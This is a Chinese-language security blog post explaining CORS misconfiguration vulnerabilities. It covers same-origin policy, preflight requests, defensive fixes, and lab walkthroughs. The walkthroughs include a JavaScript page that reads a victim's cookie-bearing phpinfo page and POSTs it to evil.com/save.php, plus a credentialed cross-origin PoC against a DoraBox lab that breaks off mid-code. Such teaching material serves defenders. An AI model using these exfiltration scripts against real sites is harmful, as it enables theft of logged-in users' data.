<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CORS跨域漏洞 | Hexo</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>CORS跨域漏洞</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-07-26T10:13:54.022Z" id="date"> 2023-07-26</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-07-27T05:28:47.464Z" id="updated"> 2023-07-27</time></div></span><br><span>Word Count: <div class="control">13k</div></span><br><span>Read Time: <div class="control">53 min</div></span></div></div><hr><div id="post-content"><h1>CORS跨域漏洞</h1>
<h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01-漏洞简介"></a>0x01 漏洞简介</h2>
<p>​		跨域资源共享(CORS)是一种放宽同源策略的机制，它允许浏览器向跨源服务器，发出 XMLHttpRequest 请求，从而克服了 AJAX 只能同源使用的限制，以使不同的网站可以跨域获取数据，目前已经被绝大多数浏览器支持，并被主流网站广泛部署使用。跨域资源共享 CORS 漏洞主要是由于程序员配置不当，对于 Origin 源校验不严格，从而造成跨域问题，攻击者可以利用 CORS 错误配置漏洞，从恶意网站跨域读取受害网站的敏感信息。<br>
​		是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。</p>
<h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3>
<p>​		这里我们必须要了解一下同源策略：同源策略是一种限制性的跨域规范，它限制了网站与源域之外的资源进行交互的能力。起源于多年前的策略是针对潜在的恶意跨域交互（例如，一个网站从另一个网站窃取私人数据）而制定的。通常，它允许一个域向其他域发出请求，但不允许访问响应。源由通信协议，域和端口号组成。<br>
​		SOP是一个很好的策略，但是随着Web应用的发展，网站由于自身业务的需求，需要实现一些跨域的功能，能够让不同域的页面之间能够相互访问各自页面的内容。</p>
<pre><code>简单来说:同时满足同协议，同域名，同端口这三个条件，就是同源。
		浏览器的同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。

SOP全称为Same Origin Policy即同源策略，该策略是浏览器的一个安全基石，同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。简单来说同源策略就是浏览器会阻止一个源与另一个源的资源交互。可以试想一下，如果没有同源策略，当你访问一个正常网站的时候又无意间打开了另一个恶意网站，恶意网站会从你刚刚访问的正常网站上窃取你全部的信息。
</code></pre>
<h3 id="跨域访问的一些场景"><a href="#跨域访问的一些场景" class="headerlink" title="跨域访问的一些场景"></a>跨域访问的一些场景</h3>
<ol>
<li>比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题。</li>
<li>程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送ajax请求，请求另外一个页面的内容的时候，就会跨域。</li>
<li>电商网站想通过用户浏览器加载第三方快递网站的物流信息。</li>
<li>子站域名希望调用主站域名的用户资料接口，并将数据显示出来。</li>
</ol>
<h3 id="跨域请求方式"><a href="#跨域请求方式" class="headerlink" title="跨域请求方式"></a>跨域请求方式</h3>
<p>CORS定义了两种跨域请求，简单跨域请求和非简单跨域请求。只要同时满足以下两大条件，就属于简单请求。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">请求方法是以下三种方法之一：<br><br>- HEAD<br>- GET<br>- POST<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">HTTP的头信息不超出以下几种字段：<br><br>- `Accept`<br>- `Accept-Language`<br>- `Content-Language`<br>- `Last-Event-ID`<br>- `Content-Type`：只限于三个值`application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`<br></code></pre></td></tr></table></figure>
<p>简单的说就是设置了一个白名单，符合这个条件的才是简单请求。其他不符合的都是非简单请求。</p>
<p>浏览器对简单请求和非简单请求的处理机制不一样。<br>
对于简单请求，浏览器就会立刻发送这个请求。<br>
对于非简单请求，浏览器不会马上发送这个请求，而是有一个preflight，跟服务器验证的过程。浏览器先发送一个options方法的预检请求。</p>
<h2 id="0x02-CORS跨域原理及漏洞成因"><a href="#0x02-CORS跨域原理及漏洞成因" class="headerlink" title="0x02-CORS跨域原理及漏洞成因"></a>0x02 CORS跨域原理及漏洞成因</h2>
<p>​		浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p>
<p>​		对于简单请求，大致流程是浏览器发现这一次向服务器提交的请求是简单请求，所以自动在头信息中增加了一个Origin的字段，用来表示这次的请求来自哪个域。<strong>当服务器接收到请求后发现Origin字段指定的域名在许可范围内</strong>，服务器会在响应包中增加三个与CORS相关的字段，Access-Control-Allow-Origin、Access-Control-Allow-Credentials、Access-Control-Expose-Headers。其中Access-Control-Allow-Origin字段是必须存在的，它的值可能是Origin字段的值或者是一个通配符“*”，表示可以接受任意域名的请求，当然大部分服务器如果配置了通配符的话，信息泄露的风险骤然加大。再回到三个字段上，其中Access-Control-Allow-Credentials字段不是必选字段，它的值是一个布尔值且只能设置为true，表示服务器允许浏览器将cookie包含在请求中，否则就不添加此字段。但需要注意的是，如果要发送cookie，Access-Control-Allow-Origin就不能设为星号，必须明确指定与请求网页一致的域名，同时Cookie依然遵循同源策略。而Access-Control-Expose-Headers字段主要是指定想要获取XMLHttpRequest对象中getResponseHeader（）方法的其他服务器字段。</p>
<p>​		所谓非简单请求就是那种对服务器提出特殊要求的请求，例如请求方法为PUT或DELETE。非简单的CORS请求会在正式通信之前，增加一次HTTP查询请求，称之为“预检请求”。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单里以及可以使用哪些HTTP动词和头信息字段。只有获得了肯定响应，浏览器才会正式发出XMLHttpRequest请求否则就报错。这种请求的好处是对传统的没有CORS支持的服务器减小压力，给服务器一个提前拒绝的机会。具体流程如下，当构造请求包的方法是PUT或DELETE并传给浏览器时，浏览器发现此请求是非简单请求所以浏览器构造一个预检请求包，请求头是OPTIONS，并携带三个关键字段，Origin、Access-Control-Request-Method、Access-Control-Request-Headers。其中Access-Control-Request-Method表示浏览器的CORS请求会用到哪些HTTP方法，Access-Control-Request-Headers表示浏览器CORS请求会额外发送的头信息字段。服务器收到预检请求后，检查了三个核心字段以后如果确定允许跨域请求，会返回一个正常的HTTP回应，并携带传入的CORS头信息。如果服务器否定请求，虽然也会返回一个正常的HTTP回应但是没有任何CORS相关的头信息字段，或明确表示请求不符合条件。浏览器根据预请求的返回结果决定接下来是进行简单请求还是拒绝请求。</p>
<p>​		CORS使用检查请求头的相关字段和服务端的规则进行对比，来选择是否允许跨域。但凡是需要配置规则的程序，避免不了会出现一些意外，就像很多资深程序员有时也会写不出恰当的正则一样，当服务端配置的规则不够合理，导致非同域的资源可以互相访问，例如Access-Control-Allow-Origin: *。CORS反而使同源策略的保护机制土崩瓦解。<strong>因此，CORS漏洞的成因很明显，就是服务端配置的规则不当所导致的。</strong></p>
<h2 id="0x03-CORS漏洞攻击流程"><a href="#0x03-CORS漏洞攻击流程" class="headerlink" title="0x03-CORS漏洞攻击流程"></a>0x03 CORS漏洞攻击流程</h2>
<p class='item-img' data-src='image-20230508151654619.png'><img src="image-20230508151654619.png" alt="image-20230508151654619"></p>
<p><a target="_blank" rel="noopener" href="http://1.xn--CORSfoo-4t3kgmi4pdzm3o6bpdn4t0clfel5uw2r5oap54qqixatex.com">1.假设用户登陆一个含有CORS配置网站foo.com</a>，<a target="_blank" rel="noopener" href="http://xn--evil-k84fui0wi3eluix9emvas11m4pa17nc6ct30ix07a1d7bhzxb45d.com">同时又访问了攻击者提供的一个链接evil.com</a>。</p>
<p>2.evil.com的网站向foo.com这个网站发起请求获取敏感数据，浏览器能否接收信息取决于foo.com的配置。</p>
<p>3.如果foo.com配置了Access-Control-Allow-Origin头且为预期，那么允许接收，否则浏览器会因为同源策略而不接收。</p>
<p><a target="_blank" rel="noopener" href="http://foo.com/index.php%E4%BB%A3%E7%A0%81%E5%A6%82%E4%B8%8B">http://foo.com/index.php代码如下</a><br class='item-img' data-src='image-20230508151744373.png'><img src="image-20230508151744373.png" alt="image-20230508151744373"></p>
<p><a target="_blank" rel="noopener" href="http://foo.com/phpinfo.php%E4%BB%A3%E7%A0%81%E5%A6%82%E4%B8%8B">http://foo.com/phpinfo.php代码如下</a></p>
<p class='item-img' data-src='image-20230508151757514.png'><img src="image-20230508151757514.png" alt="image-20230508151757514"></p>
<p>在访问index.php后再次访问phpinfo.php就可以在phpinfo页面发现httponly的COOKIE，在这里我们假设此cookie就是黑客想要获取的敏感信息。</p>
<p class='item-img' data-src='image-20230508151812220.png'><img src="image-20230508151812220.png" alt="image-20230508151812220"></p>
<p>然后构造黑客发生送给用户的恶意页面<a target="_blank" rel="noopener" href="http://evil.com/steal.html">http://evil.com/steal.html</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;!<span class="hljs-variable constant_">DOCTYPE</span>&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>CORS test<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">function</span> <span class="hljs-title function_">loadXMLDoc</span>(<span class="hljs-params"></span>)</span></span><br><span class="language-javascript"><span class="language-xml">&#123;</span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">var</span> xhr1;</span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">var</span> xhr2;</span></span><br><span class="language-javascript"><span class="language-xml">	</span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">XMLHttpRequest</span>)</span></span><br><span class="language-javascript"><span class="language-xml">    &#123;</span></span><br><span class="language-javascript"><span class="language-xml">        xhr1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span></span><br><span class="language-javascript"><span class="language-xml">        xhr2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span></span><br><span class="language-javascript"><span class="language-xml">    &#125;</span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">else</span></span></span><br><span class="language-javascript"><span class="language-xml">    &#123;</span></span><br><span class="language-javascript"><span class="language-xml">        xhr1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">        xhr2= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">    &#125;</span></span><br><span class="language-javascript"><span class="language-xml">    xhr1.<span class="hljs-property">onreadystatechange</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span></span><br><span class="language-javascript"><span class="language-xml">    &#123;</span></span><br><span class="language-javascript"><span class="language-xml">        <span class="hljs-keyword">if</span>(xhr1.<span class="hljs-property">readyState</span> == <span class="hljs-number">4</span> &amp;&amp; xhr1.<span class="hljs-property">status</span> == <span class="hljs-number">200</span>) <span class="hljs-comment">//if receive xhr1 response</span></span></span><br><span class="language-javascript"><span class="language-xml">        &#123;</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-keyword">var</span> datas=xhr1.<span class="hljs-property">responseText</span>;</span></span><br><span class="language-javascript"><span class="language-xml">            xhr2.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-string">&quot;http://evil.com/save.php&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">			<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;3&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">            xhr2.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-type&quot;</span>,<span class="hljs-string">&quot;application/x-www-form-urlencoded;charset=utf-8&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">            xhr2.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;T1=&quot;</span>+<span class="hljs-built_in">escape</span>(datas));      </span></span><br><span class="language-javascript"><span class="language-xml">        &#125;</span></span><br><span class="language-javascript"><span class="language-xml">    &#125;</span></span><br><span class="language-javascript"><span class="language-xml">    xhr1.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://foo.com/phpinfo.php&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>) <span class="hljs-comment">//request user page.</span></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-title function_">alert</span>(xhr1.<span class="hljs-property">responseText</span>);</span></span><br><span class="language-javascript"><span class="language-xml">	xhr1.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>;        <span class="hljs-comment">//request with cookie</span></span></span><br><span class="language-javascript"><span class="language-xml">    xhr1.<span class="hljs-title function_">send</span>();</span></span><br><span class="language-javascript"><span class="language-xml">&#125;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-title function_">loadXMLDoc</span>();</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
<p>当用户点开此网页时，由evil.com通过AJAX发出一个向foo.com的资源请求，所以浏览器自动添加了Origin字段。</p>
<p class='item-img' data-src='image-20230508151845461.png'><img src="image-20230508151845461.png" alt="image-20230508151845461"></p>
<p>接下来黑客将获取到的敏感信息POST提交到save.php中，而save.php将数据保存在phpinfo.html里。<a target="_blank" rel="noopener" href="http://evil.com/save.php%E4%BB%A3%E7%A0%81%E5%A6%82%E4%B8%8B%EF%BC%9A">evil.com/save.php代码如下：</a></p>
<p class='item-img' data-src='image-20230508151857434.png'><img src="image-20230508151857434.png" alt="image-20230508151857434"></p>
<p>黑客的请求流程是steal.html-&gt;phpinfo.php-&gt;save.php。我们通过BurpSuite的Repeater功能重放抓到的phpinfo.php请求包可以发现响应包是含有返回内容的，也就是请求到的资源。</p>
<p class='item-img' data-src='image-20230508151911805.png'><img src="image-20230508151911805.png" alt="image-20230508151911805"></p>
<p>但是在save.php中并没有返回的资源，通过检查浏览器的控制台提示信息发现，由于响应包缺少Access-Control-Allow-Origin响应头，导致浏览器拦截了跨源请求。</p>
<p class='item-img' data-src='image-20230508151924149.png'><img src="image-20230508151924149.png" alt="image-20230508151924149"></p>
<p><a target="_blank" rel="noopener" href="http://xn--foo-du3eo63e.com/phpinfo.php%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%9A%84%E6%B3%A8%E9%87%8A">去掉foo.com/phpinfo.php服务端的注释</a></p>
<p class='item-img' data-src='image-20230508151935869.png'><img src="image-20230508151935869.png" alt="image-20230508151935869"></p>
<p>重新访问<a target="_blank" rel="noopener" href="http://evil.com/steal.html">http://evil.com/steal.html</a></p>
<p class='item-img' data-src='image-20230508151947727.png'><img src="image-20230508151947727.png" alt="image-20230508151947727"></p>
<p>发现响应包中出现了对应的CORS响应头，Access-Control-Allow-Origin指是允许访问的源，Access-Control-Allow-Credentials指的是允许带上cookie访问资源。这样浏览器就不会出错而拦截请求了，<a target="_blank" rel="noopener" href="http://xn--jsevil-qr3js1ivpc1091bvvlsk7cgzuc3ggq8dzjxayjdjxg.com/save.php%E5%8E%BB">随后js脚本把页面编码后发送到evil.com/save.php去</a><br class='item-img' data-src='image-20230508152005865.png'><img src="image-20230508152005865.png" alt="image-20230508152005865"></p>
<p><a target="_blank" rel="noopener" href="http://xn--evil-4h9gr48auxmfr9dnft6ju.com/phpinfo.html%E9%A1%B5%E9%9D%A2%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E5%B7%B2%E7%BB%8F%E8%A2%AB%E7%AA%83%E5%8F%96%E8%BF%87%E6%9D%A5%E7%9A%84%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E3%80%82%E8%87%B3%E6%AD%A4%E6%88%90%E5%8A%9F%E5%88%A9%E7%94%A8CORS%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E8%AE%BF%E9%97%AE%E3%80%82">模拟黑客访问evil.com/phpinfo.html页面，可以发现已经被窃取过来的敏感信息。至此成功利用CORS漏洞进行跨域资源访问。</a></p>
<p class='item-img' data-src='image-20230508152019446.png'><img src="image-20230508152019446.png" alt="image-20230508152019446"></p>
<h2 id="0x04-修复及防御方式"><a href="#0x04-修复及防御方式" class="headerlink" title="0x04-修复及防御方式"></a>0x04 修复及防御方式</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1.仔细评估是否开启CORS，如果不必要就不要开启CORS<br><br>2.如果是绝对必要的话，要定义“源”的白名单。尽量不使用正则表达式配置，不要配置“Access-Contol-Allow-Origin”为通配符“*”，同时严格校验来自请求的Origin值。<br><br>3.仅仅允许安全的协议，有必要验证协议以确保不允许来自不安全通道（HTTP）的交互，否则中间人(MitM)将绕过应用是所使用的HTTPS<br><br>4.要尽可能的返回&quot;Vary: Origin&quot;这个头部，以避免攻击者利用浏览器缓存<br><br>5.如果可能的话避免使用“Credentials”头，由于“Access-Control-Allow-Credentials”标头设置为“true”时允许跨域请求中带有凭证数据，因此只有在严格必要时才应配置它。此头部也增加了CSRF攻击的风险;因此，有必要对其进行保护。<br><br>6.限制使用的方法，通过“Access-Control-Allow-Methods”头部，还可以配置允许跨域请求的方法，这样可以最大限度地减少所涉及的方法。<br><br>7.限制缓存的时间，通过“Access-Control-Allow-Methods”和“Access-Control-Allow-Headers”头部，限制浏览器缓存信息的时间。可以通过使用“Access-Control-Max-Age”标题来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值（例如大约30分钟），确保浏览器在短时间内可以更新策略（比如允许的源）。<br><br>8.仅配置所需要的头，仅在接收到跨域请求的时候才配置有关于跨域的头部，并且确保跨域请求是合法的（只允许来自合法的源）。<br></code></pre></td></tr></table></figure>
<h2 id="0x05-简单请求的示例"><a href="#0x05-简单请求的示例" class="headerlink" title="0x05-简单请求的示例"></a>0x05 简单请求的示例</h2>
<p>跨域资源共享（CORS）规范规定了在Web服务器和浏览器之间交换的标头内容，该标头内容限制了源域之外的域请求web资源。CORS规范标识了协议头中Access-Control-Allow-Origin最重要的一组。当网站请求跨域资源时，服务器将返回此标头，并由浏览器添加标头Origin。<br>
例如下面的来自站点 <a href="http://example.com/">http://example.com</a> 的网页应用想要访问 <a target="_blank" rel="noopener" href="http://bar.com/">http://bar.com</a> 的资源：</p>
<p><strong>requests</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http">1  GET /resources/public-data/ HTTP/1.1<br>2  Host: bar.com<br>3  User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre<br>4  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>5  Accept-Language: en-us,en;q=0.5<br>6  Accept-Encoding: gzip,deflate<br>7  Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7<br>8  Connection: keep-alive<br>9  Referer: http://example.com/examples/access-control/simpleXSInvocation.html<br>10 Origin: http://example.com<br></code></pre></td></tr></table></figure>
<p><strong>response</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http">11  HTTP/1.1 200 OK<br>12  Date: Mon, 01 Dec 2020 00:23:53 GMT<br>13  Server: Apache/2.0.61 <br>14  Access-Control-Allow-Origin: *<br>15  Keep-Alive: timeout=2, max=100<br>16  Connection: Keep-Alive<br>17  Transfer-Encoding: chunked<br>18  Content-Type: application/xml<br></code></pre></td></tr></table></figure>
<p>第 1~9 行是请求首部。在第10行的请求头 Origin 表明该请求来源于 <a href="http://example.com/">http://example.com</a>。<br>
第 11~18 行是来自于 <a target="_blank" rel="noopener" href="http://bar.com/">http://bar.com</a> 的服务端响应。响应中携带了响应首部字段 Access-Control-Allow-Origin（第 14 行）。使用 Origin 和 Access-Control-Allow-Origin 就能完成最简单的访问控制。本例中，服务端返回的 Access-Control-Allow-Origin: * 表明，该资源可以被任意外域访问。如果服务端仅允许来自 <a href="http://example.com/">http://example.com</a> 的访问，该首部字段的内容如下：<br>
<code>Access-Control-Allow-Origin: http://example.com</code><br>
如果跨域请求可以包含cookie的话，在服务器响应里应该有这一字段：<br>
<code>Access-Control-Allow-Credentials: true</code><br>
这样的话攻击者就可以利用这个漏洞来窃取已经在这个网站上登录了的用户的信息（利用cookie）</p>
<h2 id="0x06-漏洞利用"><a href="#0x06-漏洞利用" class="headerlink" title="0x06-漏洞利用"></a>0x06 漏洞利用</h2>
<p>这里以droabox靶场为例</p>
<p class='item-img' data-src='image-20230508155343507.png'><img src="image-20230508155343507.png" alt="image-20230508155343507"></p>
<p>这个接口会返回已登录的用户的信息数据，通过访问该网页的响应我们看到这里可能存在CORS跨域资源共享漏洞</p>
<p class='item-img' data-src='image-20230508155355927.png'><img src="image-20230508155355927.png" alt="image-20230508155355927"></p>
<p>接下来我们就可以建立一个恶意的js代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;!-- cors.<span class="hljs-property">html</span> --&gt;<br>&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>cors exp<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">function</span> <span class="hljs-title function_">cors</span>(<span class="hljs-params"></span>) &#123;  </span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">var</span> xhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();  </span></span><br><span class="language-javascript"><span class="language-xml">xhttp.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;    </span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">status</span> == <span class="hljs-number">200</span>) &#123;    </span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>);     </span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;demo&quot;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>;    <span class="hljs-comment">//作用解释如下</span></span></span><br><span class="language-javascript"><span class="language-xml">    &#125;  </span></span><br><span class="language-javascript"><span class="language-xml">&#125;;  </span></span><br><span class="language-javascript"><span class="language-xml">xhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://192.168.0.101/DoraBox/csrf/userinfo.php&quot;</span>);  </span></span><br><span class="language-javascript"><span class="language-xml">xhttp.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>;  </span></span><br><span class="language-javascript"><span class="language-xml">xhttp.<span class="hljs-title function_">send</span>();</span></span><br><span class="language-javascript"><span class="language-xml">&#125;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-title function_">cors</span>();</span></span><br><span class="language-javascript"><span 